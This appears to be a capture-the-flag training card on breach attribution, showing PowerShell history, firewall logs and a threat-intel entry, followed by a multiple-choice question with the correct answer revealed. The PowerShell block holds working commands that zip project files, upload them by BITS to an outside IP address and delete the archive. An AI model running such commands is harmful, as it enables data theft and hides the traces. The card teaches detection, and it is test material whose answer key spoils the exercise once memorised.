![image](https://github.com/user-attachments/assets/068fae26-6e8f-402f-ad69-63a4e6a1f59e)

# Hard CTF - Full Exfil Hunt and Attribution

You are investigating a breach at a defense contractor. Three data points have been collected from different sources.

---

**Endpoint - PowerShell history on workstation WS-14:**
```powershell
Compress-Archive -Path C:\Projects\NavalSpec_2024\ -DestinationPath C:\Windows\Temp\patch_cache.zip
Start-BitsTransfer -Source C:\Windows\Temp\patch_cache.zip `
                   -Destination http://45.76.112.88/drop/patch_cache.zip `
                   -TransferType Upload
Remove-Item C:\Windows\Temp\patch_cache.zip -Force
```

---

**Network - Firewall log for WS-14 around the same time:**
```
[2024-04-02 03:44:10] OUTBOUND ALLOW  BITS  →  45.76.112.88:80   112 MB
[2024-04-02 03:44:11] OUTBOUND ALLOW  BITS  →  45.76.112.88:80   (resumed)
[2024-04-02 03:51:02] OUTBOUND ALLOW  BITS  →  45.76.112.88:80   (completed)
```

---

**Threat Intel - Internal feed entry:**
```
IP: 45.76.112.88
Tags: Leviathan, APT40, C2 infrastructure
Last seen: 2024-03-29
Confidence: HIGH
```

---

## Question

Based on all three data sources, what is the most accurate and complete conclusion?

---

## Flags (Choose One)

- **A)** An insider threat manually uploaded project files during off-hours - no malware involved
- **B)** A nation-state threat actor used BITS to exfiltrate classified naval project files, covering tracks by deleting the archive after transfer
- **C)** An automated backup job misconfigured by IT sent files to a cloud storage server
- **D)** The BITS transfer was blocked by the firewall before any data left the network

---

Correct Flag: **B**

---

# Finished?
[Back to Card's Main Page](/Decks/CORE_v3.1/C2E/Backround_Intelligent_Transfer_Service_As_Exfil.md)
